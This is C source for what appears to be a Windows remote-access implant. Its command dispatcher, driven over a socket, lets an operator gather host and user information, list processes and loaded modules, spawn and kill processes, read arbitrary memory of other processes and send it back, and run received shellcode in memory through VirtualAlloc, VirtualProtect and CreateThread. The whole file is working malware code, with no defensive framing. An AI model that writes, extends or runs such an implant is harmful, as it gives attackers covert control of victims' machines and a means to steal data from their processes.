#include "command.h"

CONST COMMAND_MAP G_CommandTable[] = {
	{ CMD_QUIT,			L"quit",		CmdQuit,		L"Terminates the session"						},
	{ CMD_HELP,			L"help",		CmdHelp,		L"Prints help"									},
	{ CMD_SYSTEMINFO,	L"systeminfo",	CmdSystemInfo,	L"Displays system information"					},
	{ CMD_PS,			L"ps",			CmdPs,			L"Lists running processes"						},
	{ CMD_MODULES,		L"modules",		CmdModules,		L"List loaded DLLs (usage: modules <pid>)"	    },
	{ CMD_RUN,			L"run",			CmdRun,			L"Spawns a new process (usage: run <path>)"		},
	{ CMD_KILL,			L"kill",		CmdKill,		L"Kills a process (usage: kill <pid>)"			},
	{ CMD_PSNT,			L"ps-nt",		CmdPsNt,		L"Native 'ps'"									},
	{ CMD_MODULESNT,	L"modules-nt",	CmdModulesNt,	L"Native 'modules' (usage: modules-nt <pid>)"	},
	{ CMD_HANDLES,		L"handles",		CmdHandles,		L"Lists open handles (usage: handles <pid>)"	},
	{ CMD_SHELLCODEEXEC,L"shellcodeexec",CmdShellcodeExec,L"Executes shellcode from file (usage: shellcodeexec <path_to_file>)"	},
	{ CMD_MEMREAD,	    L"memread",		CmdMemRead,		L"Read the memory of any process the implant has permission to access (usage: memread <pid> <address> <size>)"	}
};

BOOL CmdMemRead(DWORD len, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	PWSTR information = NULL;
	PBYTE buffer = NULL;
	HANDLE hProcess = NULL;
	//need to free this
	information = Utf8ToWide(data, len);

	if (information == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Failed to get information on pid, address, size.");
		goto cleanup;
	}

	//parse information into pid, address, and size
	PWSTR delimiter = L" ";
	PWSTR context = NULL;
	PWSTR args[MAX_ARGS] = { 0 };
	DWORD argCount = 0;

	PWSTR token = wcstok_s(information, delimiter, &context);
	while (token != NULL && argCount < MAX_ARGS)
	{
		args[argCount] = token;
		argCount++;
		token = wcstok_s(NULL, delimiter, &context);
	}
	if (argCount != 3)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Parsing error occured.");
		goto cleanup;
	}

	//check if pid is valid
	if (!FindPs(args[0]))
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"PID invalid.");
		goto cleanup;
	}

	//convert address and size to proper types
	unsigned long long tempAddr = wcstoull(args[1], NULL, 16);
	LPCVOID address = (LPCVOID)tempAddr;

	//convert size to size_t
	unsigned long long tempSize = wcstoull(args[2], NULL, 0);
	SIZE_T size = (SIZE_T)tempSize;

	if (size == 0 || address == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Invalid address or size provided.");
		goto cleanup;
	}

	//read memory and send response
	DWORD pid = (DWORD)wcstoul(args[0], NULL, 10);
	hProcess = OpenProcess(PROCESS_VM_READ, FALSE, pid);

	if (hProcess == NULL)
	{
		DWORD errorCode = GetLastError();
		if (errorCode == ERROR_ACCESS_DENIED)
		{
			SendWideResponse(sock, MSG_ERROR_TYPE, L"Access Denied: You do not have permission to read this process.");
		}
		else if (errorCode == ERROR_INVALID_PARAMETER)
		{
			SendWideResponse(sock, MSG_ERROR_TYPE, L"Invalid PID: This process does not exist.");
		}
		else
		{
			SendWideResponse(sock, MSG_ERROR_TYPE, L"OpenProcess failed.");
		}
		goto cleanup;
	}

	buffer = ImplantHeapAlloc(size);
	SIZE_T bytesRead = 0;
	if (buffer == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed.");
		goto cleanup;
	}

	BOOL success = ReadProcessMemory(
		hProcess,              
		(LPCVOID)address,      
		buffer,           
		(SIZE_T)size,      
		&bytesRead              
	);
	if (!success || bytesRead == 0)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Failed to read process memory.");
		goto cleanup;
	}

	SendResponseMessage(sock, CMD_MEMREAD, (DWORD)bytesRead, buffer);

cleanup:
	if (buffer != NULL)
	{
		ImplantHeapFree(buffer);
		buffer = NULL;
	}
	if (hProcess != NULL)
	{
		CloseHandle(hProcess);
	}
	if (information != NULL)
	{
		ImplantHeapFree(information);
		information = NULL;
	}
	return TRUE;
}


BOOL CmdShellcodeExec(DWORD len, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;

	if (len == 0)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"No shellcode received.");
		goto cleanup;
	}

	//VirtualAlloc RW to write shellcode to location
	LPVOID execMem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (execMem == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"VirtualAlloc failed.");
		goto cleanup;
	}
	//WriteProcessMemory to write shellcode to allocated memory
	if (!WriteProcessMemory(GetCurrentProcess(), execMem, data, len, NULL))
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"WriteProcessMemory failed.");
		goto cleanup;
	}
	//VirtualProtect to change permissions to RX
	DWORD prevProtect = PAGE_READWRITE;
	BOOL makeExecutable = VirtualProtect(execMem, len, PAGE_EXECUTE_READ, &prevProtect);
	if (!makeExecutable)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Failed to make shellcode executable.");
		goto cleanup;
	}

	//CreateThread to execute shellcode
	HANDLE hThread = CreateThread(
		NULL,                               // Default security attributes
		0,                                  // Default stack size
		(LPTHREAD_START_ROUTINE)execMem,    // Cast the LPVOID to a thread function pointer
		NULL,                               // No parameters to pass to the thread
		0,                                  // 0 means run immediately
		NULL                                // NULL means we don't need to save the Thread ID
	);

	//Check return value of CreateThread and return the response of success of not.
	if (hThread == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Failed to create thread.");
		goto cleanup;
	}

	else
	{
		//allocate response
		response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
		ASSERT(response != NULL);
		if (response == NULL)
		{
			SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
			goto cleanup;
		}

		//send to buffer
		swprintf_s(response, responseCount, L"Shellcode execution successful!\n");

		// Best effort to send response. Don't save return value.
		SendWideResponse(sock, CMD_SHELLCODEEXEC, response);
	}
	CloseHandle(hThread);

cleanup:
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}
	return TRUE;
}

BOOL CmdQuit(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);

	// Send quit acknowledgment back to operator.
	// Best effort, so we don't check return value. 
	SendWideResponse(sock, CMD_QUIT, L"Implant shutting down.");

	// Always return FALSE to ensure implant shutdown.
	return FALSE;
}

BOOL CmdHelp(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);

	DWORD offset = 0;
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;

	response = (PWSTR) ImplantHeapAlloc((SIZE_T) MAX_RESPONSE_SIZE);
	ASSERT(response != NULL);
	if (response == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
		goto cleanup;
	}

	// Send raw command|description pairs, one per line
	// The client is responsible for formatting
	for (DWORD i = 0; i < _countof(G_CommandTable); i++)
	{
		if (offset >= responseCount)
		{
			break;
		}

		offset += swprintf_s(response + offset,
			responseCount - offset,
			L"%ls|%ls\n",
			G_CommandTable[i].cmd,
			G_CommandTable[i].help);
	}

	// Best effort to send response. Don't save return value.
	SendWideResponse(sock, CMD_HELP, response);

cleanup:
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}

	// Always return TRUE to keep implant running
	return TRUE;
}

BOOL CmdSystemInfo(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);
	
	//get system information struct
	AllSI_t sysInfo = GetAllSystemInformation();
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;

	//check if anything is NULL
	if (sysInfo.computerName == NULL || sysInfo.userName == NULL || sysInfo.architecture == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_EXECUTING_SYSINFO_COMMAND));
		goto cleanup;
	}

	//allocate response
	response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
	ASSERT(response != NULL);
	if (response == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
		goto cleanup;
	}

	//send to buffer
	swprintf_s(response, responseCount, L"%ls|%ls|%d|%ls\n", sysInfo.computerName, sysInfo.userName, sysInfo.admin, sysInfo.architecture);

	// Best effort to send response. Don't save return value.
	SendWideResponse(sock, CMD_SYSTEMINFO, response);

	//free memory
cleanup:
	if (sysInfo.computerName != NULL)
	{
		ImplantHeapFree(sysInfo.computerName);
		sysInfo.computerName = NULL;
	}
	if (sysInfo.userName != NULL)
	{
		ImplantHeapFree(sysInfo.userName);
		sysInfo.userName = NULL;
	}
	if (sysInfo.architecture!= NULL)
	{
		ImplantHeapFree(sysInfo.architecture);
		sysInfo.architecture = NULL;
	}
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}

	return TRUE;
}

BOOL CmdPs(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);
	DWORD offset = 0;
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;

	//get process information struct
	ProcessInfo_t psInfo = GetProcessInfo();
	
	//allocate response
	response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
	ASSERT(response != NULL);
	if (response == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
		goto cleanup;
	}

	// Send raw command|description pairs, one per line
	// The client is responsible for formatting
	for (DWORD i = 0; i < psInfo.numProcesses; i++)
	{
		if (offset >= responseCount)
		{
			break;
		}

		DWORD pid = psInfo.processArray[i];
		WCHAR* processName = GetProcessName(pid);

		if (processName != NULL)
		{
			//0 and 4 are System Idle Process and System process, skip printing them
			if (pid != SYS_IDLE_PS_ID && pid != SYS_PS_ID)
			{
				offset += swprintf_s(response + offset,
					responseCount - offset,
					L"%-6lu|%ls\n",
					pid,
					processName);
			}
			ImplantHeapFree(processName);
		}
	}

	// Best effort to send response. Don't save return value.
	SendWideResponse(sock, CMD_PS, response);

	//free the process Array
cleanup:
	if (psInfo.processArray != NULL)
	{
		ImplantHeapFree(psInfo.processArray);
	}
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}
	return TRUE;
}

BOOL CmdModules(DWORD len, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	DWORD offset = 0;
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;
	PWSTR pid = NULL;

	if (data == NULL || len == 0)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"PID argument missing: modules <pid>");
		goto cleanup;
	}

	//need to free this
	pid = Utf8ToWide(data, len);

	if (FindPs(pid))
	{
		DWORD* cbNeeded = ImplantHeapAlloc(sizeof(DWORD));
		if (cbNeeded != NULL)
		{
			ModuleInfo_t* modInfoArray = GetModules((DWORD)wcstoul(pid, NULL, 10), cbNeeded);
			DWORD size = *cbNeeded;

			//check if module array was succesfully gotten
			if (modInfoArray == NULL)
			{
				SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_EXECUTING_MODULES_COMMAND));
				goto cleanup;
			}

			//allocate response
			response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
			ASSERT(response != NULL);
			if (response == NULL)
			{
				SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
				goto cleanup;
			}

			for (DWORD i = 0; i < size; i++)
			{
				if (offset >= responseCount)
				{
					break;
				}

				if (modInfoArray[i].name != NULL && modInfoArray[i].path != NULL)
				{
					offset += swprintf_s(response + offset,
						responseCount - offset,
						L"%ls|%ls|%p\n",
						modInfoArray[i].name,
						modInfoArray[i].path,
						modInfoArray[i].baseAddress);
				}
				else
				{
					SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_EXECUTING_MODULES_COMMAND));
					goto cleanup;
				}
			}

			//free module info array
			for (DWORD i = 0; i < size; i++)
			{
				ImplantHeapFree(modInfoArray[i].name);
				ImplantHeapFree(modInfoArray[i].path);
			}
			ImplantHeapFree(modInfoArray);
			ImplantHeapFree(cbNeeded);
		}
		else
		{
			//problem allocating heap
			SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed.");
			goto cleanup;
		}
	}
	else
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Pid not found.");
		goto cleanup;
	}

	// Best effort to send response. Don't save return value.
	SendWideResponse(sock, CMD_MODULES, response);
	
cleanup:
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}
	if (pid != NULL)
	{
		ImplantHeapFree(pid);
		pid = NULL;
	}

	return TRUE;
}

BOOL CmdRun(DWORD len, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;
	PWSTR path = NULL;
	if (data == NULL || len == 0)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Path argument missing: run <path_to_executable>");
		goto cleanup;
	}

	path = Utf8ToWide(data, len);

	//arg is the path to the executable to run, check if valid path
	if (!SpawnChild(path))
	{
		//print error if path is invalid
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Not a valid executable path.");
		goto cleanup;
	}

	// Best effort to send response. Don't save return value.
	response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
	ASSERT(response != NULL);
	if (response == NULL)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
		goto cleanup;
	}
	swprintf_s(response, responseCount, L"Running %s...\n", path);
	SendWideResponse(sock, CMD_RUN, response);

cleanup:
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}
	if (path != NULL)
	{
		ImplantHeapFree(path);
		path = NULL;
	}

	return TRUE;
}

BOOL CmdKill(DWORD len, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	DWORD responseCount = MAX_RESPONSE_SIZE / sizeof(WCHAR);
	PWSTR response = NULL;
	PWSTR pid = NULL;

	if (data == NULL || len == 0)
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"PID argument missing: kill <pid>");
		goto cleanup;
	}
	pid = Utf8ToWide(data, len);
	// For commands that send a text response, use SendWideResponse.
	// For commands that send raw binary data, use SendResponseMessage directly.

	//check if arg is a valild PID, then kill and print message
	if (FindPs(pid))
	{
		DWORD status = Kill((DWORD)wcstoul(pid, NULL, BASE));

		response = (PWSTR)ImplantHeapAlloc((SIZE_T)MAX_RESPONSE_SIZE);
		ASSERT(response != NULL);
		if (response == NULL)
		{
			SendWideResponse(sock, MSG_ERROR_TYPE, L"Memory allocation failed");
			goto cleanup;
		}

		if (status == SUCCESS_KILL_PROCESS)
		{
			swprintf_s(response, responseCount, L"Process terminated successfully.\n");
		}
		else
		{
			wchar_t buffer[DWORD_STR_LEN];
			wsprintfW(buffer, L"%lu", status);
			swprintf_s(response, responseCount, L"Failed to terminate. Error code: %s\n", (PWSTR)buffer);
		}

		SendWideResponse(sock, CMD_KILL, response);
		goto cleanup;
	}
	else
	{
		SendWideResponse(sock, MSG_ERROR_TYPE, L"Not a valid PID");
		goto cleanup;
	}

cleanup:
	if (response != NULL)
	{
		ImplantHeapFree(response);
		response = NULL;
	}
	if (pid != NULL)
	{
		ImplantHeapFree(pid);
		pid = NULL;
	}

	return TRUE;
}

BOOL CmdPsNt(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);

	// This command takes no arguments (data/len are unused).
	SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_COMMAND_NOT_IMPLEMENTED));

	return TRUE;
}

BOOL CmdModulesNt(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);

	// data contains UTF-8 encoded PID string; see CmdKill for parsing example.
	SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_COMMAND_NOT_IMPLEMENTED));

	return TRUE;
}

BOOL CmdHandles(DWORD len, PBYTE data, SOCKET sock)
{
	UNREFERENCED_PARAMETER(len);
	UNREFERENCED_PARAMETER(data);
	ASSERT(sock != INVALID_SOCKET);

	// data contains UTF-8 encoded PID string; see CmdKill for parsing example.
	SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_COMMAND_NOT_IMPLEMENTED));

	return TRUE;
}

BOOL CommandDispatcher(DWORD cmdId, DWORD dataLen, PBYTE data, SOCKET sock)
{
	ASSERT(sock != INVALID_SOCKET);
	
	BOOL ret = TRUE;

	// Find the associated handler for the specified command ID
	for (DWORD i = 0; i < _countof(G_CommandTable); i++)
	{
		if ((DWORD)G_CommandTable[i].id == cmdId)
		{
			// Call the command handler
			ret = G_CommandTable[i].handler(dataLen, data, sock);
			goto cleanup;
		}
	}

	// Unknown command ID — send error response
	SendWideResponse(sock, MSG_ERROR_TYPE, GetCustomErrorMessage(ERROR_UNKNOWN_COMMAND));

cleanup:
	return ret;
}
